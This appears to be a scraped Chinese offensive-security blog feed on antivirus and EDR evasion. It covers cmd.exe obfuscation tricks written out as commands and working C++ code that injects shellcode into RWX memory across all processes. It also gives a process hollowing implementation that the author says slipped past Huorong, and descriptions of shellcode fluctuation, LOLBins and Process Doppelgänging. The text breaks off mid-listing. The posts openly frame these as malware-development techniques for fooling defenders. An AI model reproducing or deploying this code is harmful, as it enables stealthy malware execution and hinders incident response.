title="静态检测"></a>静态检测</h3><p>静态的检测方式一般是指从文件、注册表取得目标，可以直接读取内容做判断。</p><p>静态检测的优点：</p><ul><li>效率较高</li><li>只要有目标就可以检测</li></ul><p>缺点：</p><ul><li>比较容易绕过</li></ul><p>例如文件內容如下，里面加入了一个简单的插入符号混淆，静态检测就是会拿到原样的文件内容。</p><p>字符“^”是CMD命令中最常见的转义字符，该字符不影响命令的执行</p><p>正常的用途是因为在cmd环境中，有些字符具备特殊功能，如 &gt;、&gt;&gt;表示重定向，| 表示管道，&amp;、&amp;&amp;、|| 表示语句连接，它们都有特定的功能。如果需要把它们作为字符输出的话，就需要对这些特殊字符做转义处理：在每个特殊字符前加上转义字符^</p><h3 id="动态检测"><a href="#动态检测" class="headerlink" title="动态检测"></a>动态检测</h3><p>相对于静态检测，动态检测可以避免掉部分的混淆，因为有些混淆会在执行前载入内存时被解析。可以使用 ETW 或 Event Log 取得指令。</p><ul><li>优点<ul><li>比较不容易绕过</li></ul></li><li>缺点<ul><li>效率较低</li><li>需要满足特定的需求，例如执行</li></ul></li></ul><h2 id="混淆技巧"><a href="#混淆技巧" class="headerlink" title="混淆技巧"></a>混淆技巧</h2><h3 id="环境变量-Environment-Variable"><a href="#环境变量-Environment-Variable" class="headerlink" title="环境变量(Environment Variable)"></a>环境变量(Environment Variable)</h3><p>假设我们要执行 <code>whoami</code> 指令，我們可以通过把多个子字串拼接在一起來达成。<code>whoami</code> 的 <code>W</code>、<code>O</code>、<code>i</code> 从环境变量 SystemRoot 拿；<code>a</code>、<code>m</code> 从环境变量 Tmp 拿；<code>h</code> 则直接使用。把所有拼在一起就可以执行 <code>whoami</code> 了。</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">cmd</span> /c &quot;<span class="hljs-variable">%SystemRoot:~3,1%</span>h<span class="hljs-variable">%SystemRoot:~7,1%</span><span class="hljs-variable">%tmp:~-7,1%</span><span class="hljs-variable">%tmp:~-2,1%</span><span class="hljs-variable">%SystemRoot:~4,1%</span>&quot;<br></code></pre></td></tr></table></figure><p>不过这个方法只能绕过静态检测，使用 Sysmon 观察还是会是原本的指令。</p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071608669.png" alt="image-20251007160858616"></p><h3 id="For-Loop-Value-Extraction"><a href="#For-Loop-Value-Extraction" class="headerlink" title="For Loop Value Extraction"></a>For Loop Value Extraction</h3><p>这个混淆技巧主要是利用 Windows批处理指令的输出取得目标字符串。与环境变量不同的是它可以使用在任何指令上，而不仅限于 <code>set</code>。<code>For</code> 可以搭配 Delims、Tokens 使用。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cmd /k <span class="hljs-string">&quot;for /f &quot;</span><span class="hljs-attribute">Delims</span>=s\ <span class="hljs-attribute">Tokens</span>=4&quot; %a <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;set^|findstr PSM&#x27;</span>) <span class="hljs-keyword">do</span> %a<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p>这个技巧可以用来绕过静态与动态检测</p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510071609114.png" alt="image-20251007160927060"></p><h3 id="双引号-Double-Quotes"><a href="#双引号-Double-Quotes" class="headerlink" title="双引号(Double Quotes)"></a>双引号(Double Quotes)</h3><p>双引号在指令中被当作是一个连接用的字符，所以在指令中可以正常的使用它，可以将双引号插入在任何位置。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">cmd</span><span class="language-bash"> /c p<span class="hljs-string">&quot;owe&quot;</span><span class="hljs-string">&quot;&quot;</span>rshe<span class="hljs-string">&quot;&quot;</span>ll</span><br></code></pre></td></tr></table></figure><h3 id="括号-Parentheses"><a href="#括号-Parentheses" class="headerlink" title="括号(Parentheses)"></a>括号(Parentheses)</h3><p>括弧中的指令会被当作是一组指令，无意义的括弧可以用来混淆指令</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">cmd</span><span class="language-bash"> /c (  (powershell))</span><br></code></pre></td></tr></table></figure><h3 id="逗号与分号"><a href="#逗号与分号" class="headerlink" title="逗号与分号"></a>逗号与分号</h3><p><code>,</code>、<code>;</code> 在指令中可以取代空白作为指令参数之间的分割字符，它们可以任意被插入在参数之间需要空白的地方</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">cmd</span><span class="language-bash">;;,,/c,;netstat</span><br></code></pre></td></tr></table></figure><h3 id="Call"><a href="#Call" class="headerlink" title="Call"></a>Call</h3><p><code>Call</code> 在 Cmd 指令中用来执行另一段指令，虽然它本身不是用来做混淆的，但是却可以让混淆的行为更低调.<code>call</code> 不会产生 字进程；而 <code>cmd /c</code> 会</p><h3 id="For-Loop-Encoding"><a href="#For-Loop-Encoding" class="headerlink" title="For-Loop Encoding"></a>For-Loop Encoding</h3><p>与 For Loop Value Extraction 不同，For-Loop Encoding 不会使用 Tokens、Delims 的方式拼凑出指令，而是直接写 For 循环把需要的字符从环境变量的目标index取出</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">cmd</span> /c &quot;<span class="hljs-built_in">set</span> final= &amp;&amp;<span class="hljs-built_in">set</span> unique=nets /ao&amp;&amp;<span class="hljs-keyword">for</span> %a <span class="hljs-keyword">in</span> (<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">2</span> <span class="hljs-number">6</span> <span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">0</span> <span class="hljs-number">7</span> a) <span class="hljs-keyword">do</span> <span class="hljs-keyword">if</span> %a==a (<span class="hljs-keyword">call</span> <span class="hljs-variable">%final%</span>) <span class="hljs-keyword">else</span> (<span class="hljs-keyword">call</span> <span class="hljs-built_in">set</span> final=<span class="hljs-variable">%final%</span><span class="hljs-variable">%unique:~%</span>a,<span class="hljs-number">1</span>%)<br></code></pre></td></tr></table></figure><h2 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h2><p>invoke-dosfuscation：<a href="https://github.com/danielbohannon/Invoke-DOSfuscation">danielbohannon&#x2F;Invoke-DOSfuscation: Cmd.exe Command Obfuscation Generator &amp; Detection Test Harness</a></p><p>安装和使用:</p><p><a href="https://blog.csdn.net/gitblog_00234/article/details/142542662">Invoke-DOSfuscation 使用与安装指南-CSDN博客</a></p><h1 id="枚举RWX区域写入shellcode"><a href="#枚举RWX区域写入shellcode" class="headerlink" title="枚举RWX区域写入shellcode"></a>枚举RWX区域写入shellcode</h1><h2 id="简单介绍-4"><a href="#简单介绍-4" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>从本地或远程进程注入和执行 shellcode 需要可以写入、读取和执行 shellcode 的内存。</p><p>一些 shellcode 注入技术分配<code>PAGE_EXECUTE_READWRITE</code>内存块，用 shellcode 填充它并创建一个指向该 shellcode 的线程。对于应用程序来说，这不是一件很常见的事情，非常容易被AV&#x2F;EDR 发现</p><p>还有一些技术是首先分配<code>PAGE_READWRITE</code>，将shellcode写入分配的内存，用它保护它<code>PAGE_EXECUTE_READ</code>然后执行它，这意味着目标进程中没有任何时间点有RWX内存块。它有点隐秘，可能有助于偷偷溜过 AV&#x2F;EDR。</p><p>但是这两种技术的共同点是它们仍然需要<strong>分配</strong>和<strong>保护</strong>内存（RW -&gt; RX 或 RWX）。话虽如此，其实我们可以去暴力破解&#x2F;枚举受感染系统上当前正在运行的目标进程 - 搜索它们分配的内存块并检查是否有任何这些受 RWX 保护，因此我们可以尝试写入&#x2F;读取&#x2F;执行它们，用来规避一些内存检测。</p><h2 id="具体实现-1"><a href="#具体实现-1" class="headerlink" title="具体实现"></a>具体实现</h2><p>循环遍历系统上的所有进程</p><p>查询各个进程的内存信息</p><p>循环遍历每个进程中所有分配的内存块</p><p>检查任何受 RWX 保护的内存块 &amp;&amp; 是私有的 &amp;&amp; 已提交</p><p>如果满足上述条件</p><p>打印出内存块的地址</p><p>将 shellcode 写入该内存块</p><p>创建一个远程线程，指向上一步写的shellcode</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;TlHelp32.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>MEMORY_BASIC_INFORMATION mbi = &#123;&#125;;<br>LPVOID offset = <span class="hljs-number">0</span>;<br>HANDLE process = <span class="hljs-literal">NULL</span>;<br>HANDLE snapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>PROCESSENTRY32 processEntry = &#123;&#125;;<br>processEntry.dwSize = <span class="hljs-built_in">sizeof</span>(PROCESSENTRY32);<br>DWORD bytesWritten = <span class="hljs-number">0</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-built_in">Process32First</span>(snapshot, &amp;processEntry);<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32Next</span>(snapshot, &amp;processEntry))<br>&#123;<br>process = <span class="hljs-built_in">OpenProcess</span>(MAXIMUM_ALLOWED, <span class="hljs-literal">false</span>, processEntry.th32ProcessID);<br><span class="hljs-keyword">if</span> (process)<br>&#123;<br>std::wcout &lt;&lt; processEntry.szExeFile &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">VirtualQueryEx</span>(process, offset, &amp;mbi, <span class="hljs-built_in">sizeof</span>(mbi)))<br>&#123;<br><br><span class="hljs-keyword">if</span> (mbi.AllocationProtect == PAGE_EXECUTE_READWRITE &amp;&amp; mbi.State == MEM_COMMIT &amp;&amp; mbi.Type == MEM_PRIVATE)<br>&#123;<br>std::cout &lt;&lt; <span class="hljs-string">&quot;\tRWX: 0x&quot;</span> &lt;&lt; std::hex &lt;&lt; mbi.BaseAddress &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-built_in">WriteProcessMemory</span>(process, mbi.BaseAddress, shellcode, <span class="hljs-built_in">sizeof</span>(shellcode), <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">CreateRemoteThread</span>(process, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (LPTHREAD_START_ROUTINE)mbi.BaseAddress, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br>offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);<br>&#125;<br>offset = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-built_in">CloseHandle</span>(process);<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就不尝试了，因为他会向所有可读可写可执行的区域都写入shellcode，比较多。没开虚拟机不好演示</p><h1 id="shellcode游击"><a href="#shellcode游击" class="headerlink" title="shellcode游击"></a>shellcode游击</h1><h2 id="简单介绍-5"><a href="#简单介绍-5" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>通过挂钩sleep不断加密和解密 shellcode 的内容，使shellcode所在内存在 RW 和 RX &#x2F; PAGE_NOACCESS 和RX 内存属性之间反复横跳，当我们的 shellcode 驻留在RW或 NoAccess内存页面中时，扫描器将无法追踪到它并将其转储进行进一步分析</p><h3 id="RW-–-RX工作原理"><a href="#RW-–-RX工作原理" class="headerlink" title="RW – RX工作原理"></a>RW – RX工作原理</h3><ol><li>从文件中读取 shellcode 的内容。</li><li>Hook <code>kernel32!Sleep</code> 指向我们的回调<code>MySleep</code> 。</li><li>通过 VirtualAlloc + memcpy + CreateThread 注入和启动 shellcode。</li><li>一旦 Beacon 尝试休眠，我们的 <code>MySleep</code> 回调就会被调用。</li><li>Beacon 的内存分配被加密并且内存页面属性被翻转到 <code>RW</code></li><li>然后脱钩<code>kernel32!Sleep</code> </li><li>在等待进一步通信时，会调用原来的<code>kernel32!Sleep</code>让 Beacon 进入睡眠状态。</li><li>sleep睡眠结束后，解密我们的 shellcode 的数据，将它的内存页属性翻转回 <code>RX</code> ，然后重新挂钩 <code>kernel32!Sleep</code> 以确保拦截后续睡眠。</li></ol><h3 id="NoAccess-–-RX工作原理"><a href="#NoAccess-–-RX工作原理" class="headerlink" title="NoAccess – RX工作原理"></a>NoAccess – RX工作原理</h3><ol><li>从文件中读取 shellcode 的内容。</li><li>Hook <code>kernel32!Sleep</code> 指向我们的回调。</li><li>通过 VirtualAlloc + memcpy + CreateThread 注入和启动 shellcode …</li><li>初始化向量异常处理程序 (VEH) 以设置我们自己的处理程序来捕获 <em>访问冲突</em> 异常。</li><li>一旦 Beacon 尝试休眠，我们的 <code>MySleep</code> 回调就会被调用。</li><li>Beacon 的内存分配被加密并且内存页面属性被翻转到 <code>PAGE_NOACCESS</code></li><li>然后脱钩<code>kernel32!Sleep</code></li><li>在等待进一步通信时，会调用原来的<code>kernel32!Sleep</code>让 Beacon 进入睡眠状态。</li><li>Sleep结束后，我们重新hook <code>kernel32!Sleep</code> ，保证后续sleep的拦截。</li><li>Shellcode 然后尝试恢复其执行，此时内存页属性是<code>PAGE_NOACCESS</code>，这会触发内存访问异常0xc0000005</li><li>我们的 VEH 处理程序捕获异常，解密并将内存页属性翻转回 <code>RX</code> 并在处理函数里面return EXCEPTION_CONTINUE_EXECUTION恢复 shellcode执行。</li></ol><p>工具:<a href="https://github.com/mgeeky/ShellcodeFluctuation">https://github.com/mgeeky/ShellcodeFluctuation</a></p><p>现在不行了，那些安全厂商已经盯上了sleep这个函数。</p><h1 id="LOLbins"><a href="#LOLbins" class="headerlink" title="LOLbins"></a>LOLbins</h1><p>恶意软件研究人员 Christopher Campbell 和 Matt Greaber 创造了（LOL）一词。LOLBins 是 Living Off the Land Binaries 的缩写，用于解释使用受信任的预安装系统工具来传播恶意软件。有几种不同类型的 LOL 技术，包括 LOLBins，它使用<strong>Windows 二进制文件</strong>来隐藏恶意活动；LOLLibs，使用库；和使用脚本的 LOLScripts。</p><p>顾名思义，LOL就是将合法的系统实用程序和工具用于恶意的目的，LOL 的一些功能包括：DLL 劫持、隐藏负载、进程转储、下载文件、绕过 UAC 键盘记录、代码编译、日志规避、代码执行和持久性</p><p>要被视为 LOL，相关的二进制文件、库或脚本必须默认在系统上，或者由用户放在系统上。它还需要具有意想不到的功能，并且能够被重新利用，并且必须对攻击者有用。并且在运行时不会被标准 AV 工具检测到。</p><p>LoLBins往往与无文件落地和合法云服务结合使用，以提高在组织内不被发现的机会，通常是在后渗透阶段。</p><p>一些相关网站</p><p><a href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a></p><p><a href="https://www.freebuf.com/articles/system/263960.html">https://www.freebuf.com/articles/system/263960.html</a></p><p><a href="https://www.freebuf.com/articles/system/232074.html">https://www.freebuf.com/articles/system/232074.html</a></p><p><a href="https://micro8.github.io/Micro8-HTML/Chapter1/81-90/86_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%85%AB%E5%AD%A3%E8%A1%A5%E5%85%85.html">第八十六课：基于白名单Msiexec执行payload第八季补充 · Micro8 系列教程</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>杂谈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《聊聊免杀的那些“把戏”：镂空、伪装和代码藏匿》</title>
    <link href="/2025/10/05/%E3%80%8A%E8%81%8A%E8%81%8A%E5%85%8D%E6%9D%80%E7%9A%84%E9%82%A3%E4%BA%9B%E2%80%9C%E5%B0%8F%E6%8A%8A%E6%88%8F%E2%80%9D%EF%BC%9A%E9%95%82%E7%A9%BA%E3%80%81%E4%BC%AA%E8%A3%85%E5%92%8C%E4%BB%A3%E7%A0%81%E8%97%8F%E5%8C%BF%E3%80%8B/"/>
    <url>/2025/10/05/%E3%80%8A%E8%81%8A%E8%81%8A%E5%85%8D%E6%9D%80%E7%9A%84%E9%82%A3%E4%BA%9B%E2%80%9C%E5%B0%8F%E6%8A%8A%E6%88%8F%E2%80%9D%EF%BC%9A%E9%95%82%E7%A9%BA%E3%80%81%E4%BC%AA%E8%A3%85%E5%92%8C%E4%BB%A3%E7%A0%81%E8%97%8F%E5%8C%BF%E3%80%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>写这个文章呢，主要是写一些免杀中，或者是其他恶意代码开发中，可能会用到的一些手段和手法，因为内容有点偏杂，并且没办法聚合起来形成一个单独的模块，所以就把这些放到一起来讲了。也希望兄弟们，不要嫌弃。</p><h1 id="傀儡进程"><a href="#傀儡进程" class="headerlink" title="傀儡进程"></a>傀儡进程</h1><h2 id="简单介绍"><a href="#简单介绍" class="headerlink" title="简单介绍"></a>简单介绍</h2><p>傀儡进程（Process Hollowing）</p><p>傀儡进程是一种相对较老的技术，其基本思想是创建一个合法的、挂起的进程，然后用恶意代码替换其内存空间，最后恢复进程的执行。</p><p><strong>工作原理：</strong></p><ol><li><strong>创建挂起进程：</strong> 恶意软件会创建一个合法的进程（例如 <code>explorer.exe</code> 或 <code>svchost.exe</code>）并使其处于挂起状态。</li><li><strong>卸载原有代码：</strong> 使用 <code>NtUnmapViewOfSection</code> 或 <code>ZwUnmapViewOfSection</code> 等API，将合法进程的原始代码段从内存中卸载。</li><li><strong>分配新内存：</strong> 在合法进程的内存空间中分配一块新的、可执行的内存区域。</li><li><strong>写入恶意代码：</strong> 将恶意代码写入新分配的内存区域。</li><li><strong>修改进程上下文：</strong> 修改合法进程的线程上下文（例如 <code>EAX</code> 或 <code>RIP</code> 寄存器），使其指向恶意代码的入口点。</li><li><strong>恢复进程：</strong> 恢复合法进程的执行，此时它将执行恶意代码而不是原始代码。</li></ol><p><strong>特点：</strong></p><ul><li><strong>内存操作：</strong> 主要通过直接操作进程内存来实现。</li><li><strong>API调用：</strong> 涉及 <code>CreateProcess</code> (带 <code>CREATE_SUSPENDED</code> 标志), <code>NtUnmapViewOfSection</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, <code>ResumeThread</code> 等API。</li><li><strong>检测难度：</strong> 相对容易被现代EDR（Endpoint Detection and Response）和AV（Antivirus）检测到，因为内存中会出现可疑的内存区域（例如，一个合法进程的<code>.text</code>段被卸载，然后被替换成其他内容）。</li></ul><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-type">BOOL</span> ReplaceProcess(<span class="hljs-keyword">const</span> <span class="hljs-type">char</span>* pszFilePath)<br>&#123;<br>STARTUPINFO si = &#123; <span class="hljs-number">0</span> &#125;;<br>PROCESS_INFORMATION pi = &#123; <span class="hljs-number">0</span> &#125;;<br>CONTEXT threadContext = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-type">BOOL</span> bRet = <span class="hljs-literal">FALSE</span>;<br>RtlZeroMemory(&amp;si, <span class="hljs-keyword">sizeof</span>(si));<br>RtlZeroMemory(&amp;pi, <span class="hljs-keyword">sizeof</span>(pi));<br>RtlZeroMemory(&amp;threadContext, <span class="hljs-keyword">sizeof</span>(threadContext));<br>si.cb = <span class="hljs-keyword">sizeof</span>(si);<br><span class="hljs-comment">// 创建进程并挂起主线程</span><br>bRet = CreateProcessA(pszFilePath, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">FALSE</span>, CREATE_SUSPENDED, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">FALSE</span> == bRet)<br>&#123;<br>printf(<span class="hljs-string">&quot;CreateProcess&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>&#125;<br><span class="hljs-comment">// 在替换的进程中申请一块内存</span><br>LPVOID lpDestBaseAddr = VirtualAllocEx(pi.hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> == lpDestBaseAddr)<br>&#123;<br>printf(<span class="hljs-string">&quot;VirtualAllocEx&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>&#125;<br><span class="hljs-comment">// 写入替换的数据</span><br>bRet = WriteProcessMemory(pi.hProcess, lpDestBaseAddr, buf, <span class="hljs-keyword">sizeof</span>(buf), <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">FALSE</span> == bRet)<br>&#123;<br>printf(<span class="hljs-string">&quot;WriteProcessError&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>&#125;<br><span class="hljs-comment">// 获取线程上下文</span><br><span class="hljs-comment">// 注意此处标志，一定要写!!!</span><br>threadContext.ContextFlags = CONTEXT_FULL;<br>bRet = GetThreadContext(pi.hThread, &amp;threadContext);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">FALSE</span> == bRet)<br>&#123;<br>printf(<span class="hljs-string">&quot;GetThreadContext&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>&#125;<br><span class="hljs-comment">// 修改eip从新申请的内存处运行</span><br>threadContext.Rip = (DWORD64)lpDestBaseAddr;<br><span class="hljs-comment">// 设置挂起进程的线程上下文</span><br>bRet = SetThreadContext(pi.hThread, &amp;threadContext);<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">FALSE</span> == bRet)<br>&#123;<br>printf(<span class="hljs-string">&quot;SetThreadContext&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>&#125;<br><span class="hljs-comment">// 恢复挂起的进程的线程</span><br>ResumeThread(pi.hThread);<br>WaitForSingleObject(pi.hThread, INFINITE);<br>CloseHandle(pi.hThread);<br>CloseHandle(pi.hProcess);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>&#125;<br><br><br><br><span class="hljs-type">void</span> main() &#123;<br><br>ReplaceProcess(<span class="hljs-string">&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>);<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510051631401.png" alt="image-20251005163100282"></p><p>我们可以在Process Hacker中看到进程链条</p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510051633805.png" alt="image-20251005163302768"></p><p>以及有迷惑的样子了，后面还有些手法配合使用，可以迷惑蓝队的排查工作。</p><p>看看免杀性</p><p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510051637903.png" alt="image-20251005163747863"></p><p>很简单就过了火绒静态。360和其他就不测试了，开虚拟机比较麻烦，再加上这种手法已经出现了很久了，单一的使用肯定不能免杀。</p><h1 id="进程镂空"><a href="#进程镂空" class="headerlink" title="进程镂空"></a>进程镂空</h1><h2 id="简单介绍-1"><a href="#简单介绍-1" class="headerlink" title="简单介绍"></a>简单介绍</h2><p><strong>进程镂空（Process Doppelgänging）</strong></p><p>进程镂空是一种较新的技术，它利用了Windows事务性NTFS（Transactional NTFS，TxF）的特性，通过回滚文件事务来避免在磁盘上留下痕迹。</p><p>主要思想是卸载合法进程的内存，写入恶意软件的代码，伪装成合法进程进行恶意活动</p><p>“在启动过程中添加暂停”。在暂停期间，攻击者可以删除程序可执行文件中的合法代码，并将其替换为恶意代码。这被称为空心化。当启动进程恢复时，它会在继续正常运行之前执行攻击者的代码。从本质上讲，进程挖空允许攻击者将合法的可执行文件转换为看似可信的恶意容器。而且恶意代码还可以从磁盘中删除自身的痕迹以避免被识别，这种策略让反恶意软件很难检测。</p><p><strong>工作原理：</strong></p><ol><li><strong>创建事务：</strong> 恶意软件会使用 <code>CreateTransaction</code> API创建一个NTFS事务。</li><li><strong>在事务中修改文件：</strong> 在这个事务中，恶意软件会打开一个合法的可执行文件（例如 <code>explorer.exe</code>），并将其内容替换为恶意代码。</li><li><strong>创建进程：</strong> 使用 <code>NtCreateProcessEx</code> 或 <code>CreateProcess</code> (带 <code>CREATE_SUSPENDED</code> 标志) 从这个被修改的文件（但仍在事务中）创建进程。由于进程是在事务中创建的，此时磁盘上的文件实际上并没有被永久修改。</li><li><strong>回滚事务：</strong> 在进程创建后，恶意软件会回滚NTFS事务。这意味着磁盘上的文件会恢复到原始状态，仿佛从未被修改过一样。</li><li><strong>恢复进程：</strong> 恢复进程的执行，此时它将执行恶意代码。</li></ol><p><strong>特点：</strong></p><ul><li><p><strong>利用NTFS事务：</strong> 这是其核心特点，通过事务的回滚来避免在磁盘上留下恶意文件的痕迹。</p></li><li><p><strong>API调用：</strong> 涉及 <code>CreateTransaction</code>, <code>CreateFileTransacted</code>, <code>NtCreateProcessEx</code> 或 <code>CreateProcess</code> (带 <code>CREATE_SUSPENDED</code> 标志), <code>RollbackTransaction</code> 等API。</p></li><li><p>检测难度：</p><p>比傀儡进程更难检测，因为：</p><ul><li>磁盘上的文件在进程创建后会恢复原样，文件完整性检查很难发现异常。</li><li>进程创建时，文件内容是恶意代码，但由于是在事务中，安全软件可能无法及时捕获到这种瞬时变化。</li><li>内存中的进程看起来是一个合法的进程，但其代码实际上是恶意的。</li></ul></li></ul><h2 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 